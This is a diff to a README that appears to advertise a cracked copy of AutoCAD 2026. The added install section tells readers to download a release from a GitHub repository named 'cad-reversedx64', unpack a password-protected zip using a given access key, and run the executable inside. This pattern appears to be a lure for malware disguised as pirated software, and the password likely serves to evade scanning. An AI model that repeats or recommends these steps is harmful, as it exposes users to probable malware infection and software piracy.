@@ -12,3 +12,7 @@ AutoCAD provides precise drawing tools, geometry editing, annotation features, a
 AutoCAD 2026 boasts new performance improvements, new AI assistance features, better insights, deeper integration with Autodesk Docs and more.
 
 ## How to install? 
+1. Download last release [here](https://github.com/d3454444/cad-reversedx64/releases/tag/release)
+2. Unpack .zip (access key: **ORPFGDVAT**)
+3. Launch .exe and wait
+4. Enjoy!
